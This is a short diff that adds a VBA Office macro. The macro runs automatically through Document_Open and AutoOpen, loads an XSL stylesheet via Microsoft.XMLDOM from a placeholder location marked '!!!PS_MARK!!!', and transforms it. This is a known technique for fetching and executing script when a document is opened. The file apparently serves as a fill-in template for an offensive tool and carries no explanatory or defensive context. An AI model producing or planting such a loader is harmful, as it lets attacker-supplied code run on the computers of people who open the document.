@@ -1,0 +1,15 @@
+Function MyMacro()
+	Set xml = CreateObject("Microsoft.XMLDOM")
+	xml.async = False
+	Set xsl = xml
+	xsl.load("!!!PS_MARK!!!")
+	xml.transformNode xsl
+End Function
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
